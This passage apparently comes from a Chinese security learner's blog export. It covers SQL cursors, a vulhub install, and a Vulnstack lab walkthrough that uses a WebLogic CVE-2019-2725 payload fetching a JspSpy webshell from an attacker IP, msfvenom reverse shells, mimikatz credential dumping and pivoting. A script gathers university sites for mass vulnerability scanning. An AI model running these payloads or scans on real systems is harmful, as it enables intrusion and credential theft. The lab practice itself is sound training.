<h1 id="第二十一课-使用游标"><a href="#第二十一课-使用游标" class="headerlink" title="第二十一课 使用游标"></a>第二十一课 使用游标</h1><h2 id="20-1-游标"><a href="#20-1-游标" class="headerlink" title="20.1 游标"></a>20.1 游标</h2><p>在使用游标前，必须声明他。</p>
<p>一旦声明，就必须打开游标以供使用。</p>
<p>对于填有数据的游标，根据需要取出(检索)各行。</p>
<p>在结束游标使用时，必须关闭，</p>
<h3 id="20-1-1创建游标"><a href="#20-1-1创建游标" class="headerlink" title="20.1.1创建游标"></a>20.1.1创建游标</h3><p>使用DECLARE语句创建游标，这条语句在不同的dbms中有所不同。</p>
<p>DECLARE命名游标，并定义相应的select语句。</p>
<p>下面是mysql和sqlserver的例子</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> CustCUrosr <span class="keyword">CURSOR</span></span><br><span class="line"><span class="keyword">FOR</span> </span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Customers</span><br></pre></td></tr></table></figure>

<h3 id="20-1-2使用游标"><a href="#20-1-2使用游标" class="headerlink" title="20.1.2使用游标"></a>20.1.2使用游标</h3><p>使用OPEN CURSOR 语句打开游标，这条语句很简单，在大多数dbms中的语法相同：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">OPEN</span> SURSOR CustoCurso</span><br></pre></td></tr></table></figure>

<p>现在可以用FETCH语句访问游标数据了，指出要检索哪些行，从何处检索他们以及将他们放于何处。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> TYPE CustCursor <span class="keyword">IS</span> <span class="keyword">REF</span> <span class="keyword">CURSOR</span> </span><br><span class="line">    <span class="keyword">RETURN</span> Customers<span class="operator">%</span>ROWTUPE;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">    <span class="keyword">OPEN</span> CustCursor;</span><br><span class="line">    <span class="keyword">FETCH</span> CustCursor <span class="keyword">INTO</span> CustRecord;</span><br><span class="line">    <span class="keyword">CLOSE</span> CustCursor;</span><br><span class="line"><span class="keyword">END</span>;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-readbook</category>
      </categories>
  </entry>
  <entry>
    <title>vulhub安装与使用</title>
    <url>/2022/06/02/vulhub%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="vulhub安装与使用"><a href="#vulhub安装与使用" class="headerlink" title="vulhub安装与使用"></a>vulhub安装与使用</h1><p>首先要个纯净ubuntu</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#1:docker</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install -y docker.io</span><br><span class="line">systemctl enable docker --now</span><br><span class="line">sudo apt install docker-compose</span><br><span class="line"></span><br><span class="line">#2:vulhub</span><br><span class="line">git clone https://github.com/vulhub/vulhub</span><br><span class="line">cd</span><br><span class="line">sudo docker-compose build</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line">sudo docker-compose down -v</span><br><span class="line">sudo docker ps</span><br></pre></td></tr></table></figure>

<h2 id="路径查看"><a href="#路径查看" class="headerlink" title="路径查看"></a>路径查看</h2><p><a href="https://vulhub.org/#/environments/">Vulhub - Docker-Compose file for vulnerability environment</a></p>
<h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><p><a href="https://blog.csdn.net/m0_48831859/article/details/124197534">(82条消息) 虚拟机与物理机能相互ping通但为什么访问不了vulhub搭建的靶场_灿什么灿的博客-CSDN博客_vulhub无法访问</a></p>
<p><a href="https://blog.csdn.net/qq_52243589/article/details/121128848">(82条消息) 搭建vulhub以及物理机访问虚拟机docker环境_财鸟的博客-CSDN博客_vulhub虚拟机</a></p>
<p><a href="http://dljz.nicethemes.cn/news/show-391495.html">虚拟机与物理机能相互ping通但为什么访问不了vulhub搭建的靶场 (nicethemes.cn)</a></p>
]]></content>
      <categories>
        <category>-fuxian</category>
      </categories>
  </entry>
  <entry>
    <title>vulnstack 红日靶场 二</title>
    <url>/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/</url>
    <content><![CDATA[<h1 id="vulnstack-红日靶场-二"><a href="#vulnstack-红日靶场-二" class="headerlink" title="vulnstack 红日靶场 二"></a>vulnstack 红日靶场 二</h1><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>以下是拓扑图</p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/1.png" alt="img"></p>
<p>1qaz@WSX</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">web和pc两个网卡，一个nat一个仅主机，nat使用自动获取ip</span><br><span class="line">域控只有一个网卡，仅主机，只用能用内网访问</span><br><span class="line"></span><br><span class="line">开启服务</span><br><span class="line">进入WEB中，来到C:\Oracle\Middleware\user_projects\domains\base_domain\bin 路径</span><br><span class="line">使用管理员才能进去administrator/1qaz@WSX</span><br><span class="line">以管理员权限执行startWebLogic</span><br></pre></td></tr></table></figure>

<h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><p>首先拿到目标ip，我们进行一个端口扫描。</p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220818213441285.png" alt="image-20220818213441285"></p>
<p>其他端口的测试这里就不说了，这里我们使用weblogic扫描工具</p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220818221438834.png" alt="image-20220818221438834"></p>
<p>存在CVE-2019-2725</p>
<p>在网上找到利用方法</p>
<p>访问</p>
<p><a href="http://192.168.100.131:7001/_async/AsyncResponseService">http://192.168.100.131:7001/_async/AsyncResponseService</a></p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220818221643711.png" alt="image-20220818221643711"></p>
<p>随即使用poc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /_async/AsyncResponseService HTTP/1.1</span><br><span class="line">Host: 192.168.37.128:7001</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 850</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">SOAPAction:</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: Apache-HttpClient/4.1.1 (java 1.5)</span><br><span class="line">Connection: keep-alive</span><br><span class="line">content-type: text/xml</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot;</span><br><span class="line">xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;</span><br><span class="line">&lt;soapenv:Header&gt;</span><br><span class="line">&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;</span><br><span class="line">&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;wget http://192.168.37.141:8080/JspSpy.jsp -O servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/JspSpy.jsp&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&gt;</span><br><span class="line">&lt;asy:onAsyncDelivery/&gt;</span><br><span class="line">&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>

<p>我这里没有利用成功，弄了半天也没弄好，暂时放一下，后面再另外搭环境仔细复现一下。</p>
<p>现在我们使用msf工具中现成的exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search CVE-2019-2725</span><br></pre></td></tr></table></figure>

<p>好家伙，exp也用不了，让我怀疑是不是环境出了问题，故去web服务器那看了一下。</p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220819164614026.png" alt="image-20220819164614026"></p>
<p>居然报错了，也不知道是什么原理，百度。</p>
<p>好家伙，是权限不足的原因，web要登录de1ay的管理员administrator账号才可以。</p>
<p>好的，然后360直接就给你拦截了</p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220819170807062.png" alt="image-20220819170807062"></p>
<p>受不了了，直接上工具</p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220819174013015.png" alt="image-20220819174013015"></p>
<p>这时候上线msf或者cs就可以开始下一步的渗透了。</p>
<p>先穿上一个冰蝎马</p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220819183249345.png" alt="image-20220819183249345"></p>
<p>试着连接一下</p>
<p>发现连接成功！</p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220819183539196.png" alt="image-20220819183539196"></p>
<p>然后我们试着传一个msf的马</p>
<p>传上去是传的上去，但是无法执行</p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220819183745631.png" alt="image-20220819183745631"></p>
<p>但是我目前还不太会免杀捏，直接双击了</p>
<p>但是突然接了个项目，明天再战。</p>
<p>真的会谢，来了这学校之后电脑都变慢了，环境也不知道怎么回事毁掉了，只能重新装一遍靶场</p>
<p>最后还是用以上方法拿到权限。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.248.128 LPORT=1234 -f exe -o 1.exe   </span><br><span class="line">#生成木马</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter_reverse_tcp</span><br><span class="line">set lhost 192.168.248.128</span><br><span class="line">set lport 1234</span><br><span class="line">exploit </span><br><span class="line">#监听</span><br></pre></td></tr></table></figure>



<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220822140459372.png" alt="image-20220822140459372"></p>
<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>先收集本机的一些信息（如果连接windowsshell是乱码的状态可以使用这个语句解决<code>chcp 65001</code></p>
<p>arp、路由、杀软、防火墙、3389、hash密码、域内信息等</p>
<p>当前用户是域管理员</p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220822142857742.png" alt="image-20220822142857742"></p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220822141759574.png" alt="image-20220822141759574"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220822142810625.png" alt="image-20220822142810625"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist</span><br></pre></td></tr></table></figure>

<p>发现360卫视</p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220822143044769.png" alt="image-20220822143044769"></p>
<p><code>net user /domain</code></p>
<p>查看域内用户</p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220822143209338.png" alt="image-20220822143209338"></p>
<p>net time /domain查域控</p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220822143345350.png" alt="image-20220822143345350"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">**net config workstation 查看是否有域，以及当前登录域**</span><br><span class="line"></span><br><span class="line">**net view 查看域内主机列表**</span><br><span class="line"></span><br><span class="line">**net group &quot;domain controllers&quot; /domain 查看域控制器(如果有多台)**</span><br><span class="line"></span><br><span class="line">**net user /domain 查看域内所有域用户**</span><br><span class="line"></span><br><span class="line">**net group &quot;domain admins&quot; /domain 查看域管理员列表**</span><br><span class="line"></span><br><span class="line">**然后通过ping 命令查看域中主机的ip**</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systeminfo 查下补丁</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220822143749830.png" alt="image-20220822143749830"></p>
<p>最后整理一下吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">域名 de1ay                   杀软：360安全卫士          </span><br><span class="line"></span><br><span class="line">域内主机：三台  DC（10.10.10.10）  PC （10.10.10.201） WEB（10.10.10.80 和192.168.111.80   win2008R2）</span><br><span class="line"></span><br><span class="line">域用户：Administrator            de1ay                    Guest                    krbtgt                   mssql    </span><br><span class="line"></span><br><span class="line"> 补丁：                  [01]: KB2999226</span><br><span class="line">                           [02]: KB958488</span><br><span class="line">                           [03]: KB976902</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h3><p>有大佬提出这样的一个攻击思路</p>
<p>尝试直接新建具有鱼贯权限的用户hack，密码为1qaz@wsx，然后开3389远程登录 (不推荐）</p>
<p>但我还在学习阶段就暂时不用这种了。</p>
<p>用kiwi抓明文密码把</p>
<p>首先迁移进程到一个64位的system进程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps</span><br><span class="line">migrate 1928</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220822145222477.png" alt="image-20220822145222477"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">kiwi_cmd sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220822145658759.png" alt="image-20220822145658759"></p>
<p>拿到其他主机的账号和密码</p>
<h3 id="路由或者代理实现横向"><a href="#路由或者代理实现横向" class="headerlink" title="路由或者代理实现横向"></a>路由或者代理实现横向</h3><ul>
<li>在内网渗透的时候，有时候我们想继续探测内网的资源，但是由于防火墙的原因导致我们无法继续访问内部资源，此时我们就可以考虑添加路由或者端口转发等技术。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf实现路由添加</span><br><span class="line"></span><br><span class="line">msf查看网卡情况，并且添加路由</span><br><span class="line">#获取当前主机下的网络架构分布</span><br><span class="line">run get_local_subnets</span><br><span class="line"></span><br><span class="line">添加路由访问</span><br><span class="line">run autoroute -s 192.168.22.0/24</span><br><span class="line"></span><br><span class="line">#在全局给指定的session增删路由</span><br><span class="line"></span><br><span class="line">route add 192.168.11.0  255.255.255.0  1     #在session1中添加到达192.168.11.0网段的路由</span><br><span class="line">route add 192.168.12.0  255.255.255.0  1     #在session1中添加到达192.168.12.0网段的路由</span><br><span class="line">route add 0.0.0.0       0.0.0.0        1     #在session1中添加到达0.0.0.0/24网段的路由</span><br><span class="line">route del 192.168.12.0  255.255.255.0  2     #在session2中删除到达192.168.12.0网段的路由</span><br><span class="line">route print    #打印路由信息</span><br><span class="line"></span><br><span class="line">查看当前路由列表</span><br><span class="line">run autoroute -p</span><br><span class="line"></span><br><span class="line">查看当前网络下IP列表端口</span><br><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">set ports 80</span><br><span class="line">set rhosts 192.168.22.0/24</span><br><span class="line">set threads 100</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">利用proxychain配合socks4代理渗透</span><br><span class="line">如果我们不想在msf里面探测，我们可以使用socks4代理，实现在代理扫描，漏洞探测</span><br><span class="line">配置socks4代理</span><br><span class="line">use auxiliary/server/socks4a</span><br><span class="line">set srvport 2222</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">修改proxychain配置加入</span><br><span class="line">vim /etc/proxychains.conf</span><br><span class="line">socks4 192.168.131.159 2222</span><br><span class="line"></span><br><span class="line">调用代理执行nmap扫描目标</span><br><span class="line">proxychains nmap -Pn -sT 192.168.22.128</span><br></pre></td></tr></table></figure>

<p>改路由没扫到其他主机，不知道怎么回事</p>
<p>那我们挂个socks代理对内网的主机进行一个探测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nmap -PA 192.168.123.1/24</span><br><span class="line">#扫存活主机</span><br><span class="line"></span><br><span class="line">proxychains nmap -Pn -sT -T4 -p21,22,135,445,80,53,3389,8080,1433,8080 10.10.10.10</span><br><span class="line">#扫指定主机</span><br></pre></td></tr></table></figure>

<p><a href="https://www.cxy163.net/archives/2081">nmap扫描局域网存活主机_nmap扫描在线主机的几种方法 | 绝缘体 (cxy163.net)</a></p>
<p>代理我后面再开个靶场自己练习</p>
<p>啥也没扫到，我人嘛了，直接上cs辅助吧。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">background</span><br><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set DisablePayloadHandler true</span><br><span class="line">set lhost 192.168.235.129</span><br><span class="line">set lport 8888</span><br><span class="line">set session 2</span><br><span class="line">run</span><br><span class="line">#cs那边记得监听</span><br></pre></td></tr></table></figure>

<p>好成功上线</p>
<p>这里使用cs的扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先扫一下内网存活主机</span><br><span class="line">shell arp -a</span><br></pre></td></tr></table></figure>



<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220823154602108.png" alt="image-20220823154602108"></p>
<p>然后可以开始横向了</p>
<h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a><strong>横向移动</strong></h3><p>ping一下DC PC可以看到他们的ip</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DC 10.10.10.10</span><br><span class="line">PC 10.10.10.201</span><br></pre></td></tr></table></figure>

<p>这里可以扫一下内网主机+端口扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">portscan 网段 端口 协议（icmp arp none）线程</span><br><span class="line">portscan 10.10.10.0/24 445 arp 50</span><br><span class="line"></span><br><span class="line">portscan 10.10.10.0/24 1-1024,3389,5000-6000 arp 1024</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220823155316578.png" alt="image-20220823155316578"></p>
<p>既然存在445端口，那么可以用run minikatz模块进行横向（虽然早就拿到账号密码了</p>
<p>抓到密码之后创建一个smb，然后对目标主机进行横向</p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220823160610417.png" alt="image-20220823160610417"></p>
<p>dc主机成功上线！</p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220823160753720.png" alt="image-20220823160753720"></p>
<p>在那边pc也是没有过免杀的（360弹窗了，麻了，后面再学免杀把。</p>
<p>随后也是成功上线pc</p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220823162540948.png" alt="image-20220823162540948"></p>
<p>拿下靶场！</p>
<p><a href="https://blog.csdn.net/Ping_Pig/article/details/121229030">(96条消息) psexec的底层实现原理是什么_Ping_Pig的博客-CSDN博客_psexec原理</a></p>
]]></content>
      <categories>
        <category>-bachang</category>
      </categories>
  </entry>
  <entry>
    <title>xray+rad 自动化edusrc</title>
    <url>/2022/02/08/xray-rad-%E8%87%AA%E5%8A%A8%E5%8C%96edusrc/</url>
    <content><![CDATA[<h1 id="xray-rad-自动化edusrc"><a href="#xray-rad-自动化edusrc" class="headerlink" title="xray+rad 自动化edusrc"></a>xray+rad 自动化edusrc</h1><p>最近挖洞效率低下，学习了下扫描器</p>
<h1 id="1-爬取漏洞平台上各大学校的网址"><a href="#1-爬取漏洞平台上各大学校的网址" class="headerlink" title="1.爬取漏洞平台上各大学校的网址"></a>1.爬取漏洞平台上各大学校的网址</h1><p><img src="/2022/02/08/xray-rad-%E8%87%AA%E5%8A%A8%E5%8C%96edusrc/image-20220208144944272.png" alt="image-20220208144944272"></p>
<p>写了个小爬虫，有些会爬到百度百科里面，但是不影响，后面加个判断就好了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">allpage = <span class="number">199</span></span><br><span class="line">all_school = <span class="built_in">dict</span>()</span><br><span class="line"><span class="comment">#获取学校名字</span></span><br><span class="line">handers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Edg/97.0.1072.76&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;开始获取学校名称和网址&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,allpage):</span><br><span class="line">    <span class="comment">#获取学校名称</span></span><br><span class="line">    url = <span class="string">f&#x27;https://src.sjtu.edu.cn/rank/firm/?page=<span class="subst">&#123;page&#125;</span>&#x27;</span></span><br><span class="line">    page_text = requests.get(url,headers=handers).text</span><br><span class="line">    tree = etree.HTML(page_text)</span><br><span class="line">    content = tree.xpath(<span class="string">f&#x27;//tr[@class=&quot;row&quot;]//a//text()&#x27;</span>)</span><br><span class="line">    <span class="comment">#定义一个进度条用的东西</span></span><br><span class="line">    index = <span class="number">1</span></span><br><span class="line">    <span class="comment">#从bing上获取学校官网</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> content:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(url=<span class="string">f&#x27;https://cn.bing.com/search?q=<span class="subst">&#123;item&#125;</span>&#x27;</span>, headers=handers).text</span><br><span class="line">            tree2 = etree.HTML(response)</span><br><span class="line">            content2 = tree2.xpath(<span class="string">f&#x27;/html/body/div[1]/main/ol/li[1]/div[1]/h2/a/@href&#x27;</span>)</span><br><span class="line">            <span class="comment">#把结果存入字典</span></span><br><span class="line">            all_school[item]=content2[<span class="number">0</span>]</span><br><span class="line">            <span class="built_in">print</span>(item + <span class="string">f&#x27;  <span class="subst">&#123;content2[<span class="number">0</span>]&#125;</span>  &#x27;</span>+<span class="string">f&#x27;第<span class="subst">&#123;page&#125;</span>/<span class="subst">&#123;allpage&#125;</span>页----<span class="subst">&#123;index/<span class="number">15</span>*<span class="number">100</span>&#125;</span>%&#x27;</span>)</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;item&#125;</span>出错啦！&quot;</span>)</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line"><span class="comment">#持久化存储</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./学校网址.txt&#x27;</span>,mode=<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> all_school.keys():</span><br><span class="line">        fp.write(<span class="string">f&#x27;<span class="subst">&#123;key&#125;</span>    <span class="subst">&#123;all_school[key]&#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="comment">#单独存储url方便扫描</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;url.txt&#x27;</span>,mode=<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp2:</span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> all_school.values():</span><br><span class="line">        fp2.write(<span class="string">f&#x27;<span class="subst">&#123;value&#125;</span>\n&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="2-用xray和rad联动扫描url"><a href="#2-用xray和rad联动扫描url" class="headerlink" title="2.用xray和rad联动扫描url"></a>2.用xray和rad联动扫描url</h1><p>工具是别人的</p>
<p>xray的被动扫描能力很强，但是主动扫描就弱了点，而rad的爬虫功能很强，所以将两种结合起来就能取长补短。但是它们两者不能进行批量检测。所以写了个脚本让两者结合进行批量检测。</p>
<p>首先将xray与rad所在文件夹加入到环境变量中，环境变量——用户变量——path——编辑</p>
<p><img src="/2022/02/08/xray-rad-%E8%87%AA%E5%8A%A8%E5%8C%96edusrc/143380522-dc9a5510-1527-4c68-a628-d33460a1ba37.png" alt="image"></p>
<p>使用的是python3，安装依赖库<br>pip install pypiwin32<br>pip isntall requests</p>
<p>注意，系统需要装有chrome浏览器<br>之后将要扫描的目标放在url.txt文件中，一个目标一行。接着点击xray批量自动检测.bat</p>
<p>启动后如下，输入xray扫描后的漏洞文件名，然后rad框中输入任意的数字 </p>
<p><img src="/2022/02/08/xray-rad-%E8%87%AA%E5%8A%A8%E5%8C%96edusrc/143380572-06ebf313-6064-457f-90be-71b6711db3ae.png" alt="image"></p>
<p>过程如下 </p>
<p><img src="/2022/02/08/xray-rad-%E8%87%AA%E5%8A%A8%E5%8C%96edusrc/143380597-5a848ac8-d8d6-4070-8bb0-0879fc7093de.png" alt="image"></p>
<p> 如果扫描出漏洞后会自动弹出浏览器漏洞报告</p>
<h2 id="靶场测试"><a href="#靶场测试" class="headerlink" title="靶场测试"></a>靶场测试</h2><p><img src="/2022/02/08/xray-rad-%E8%87%AA%E5%8A%A8%E5%8C%96edusrc/image-20220208162054937.png" alt="image-20220208162054937"></p>
<p>超！完美！</p>
<p>链接：<a href="https://pan.baidu.com/s/14pENeqIq-zAIvPgA92n9sw">https://pan.baidu.com/s/14pENeqIq-zAIvPgA92n9sw</a><br>提取码：flag{Favorite anime characters}</p>
]]></content>
      <categories>
        <category>-lunzi</category>
      </categories>
  </entry>
  <entry>
    <title>KIOPTRIX: LEVEL 1.1 (#2)</title>
    <url>/2022/11/01/%C2%96KIOPTRIX-LEVEL-1-1-2/</url>
    <content><![CDATA[<h1 id="KIOPTRIX-LEVEL-1-1-2"><a href="#KIOPTRIX-LEVEL-1-1-2" class="headerlink" title="KIOPTRIX: LEVEL 1.1 (#2)"></a>KIOPTRIX: LEVEL 1.1 (#2)</h1><p>现在的我是刷靶场狂魔，同时也继续在了解oscp相关的介绍，争取寒假的时候就给考完把。</p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>首先还是通过nmap扫c段拿到自己靶机的位置（记得改nat</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.100.0/24 -n -sP -sn</span><br></pre></td></tr></table></figure>

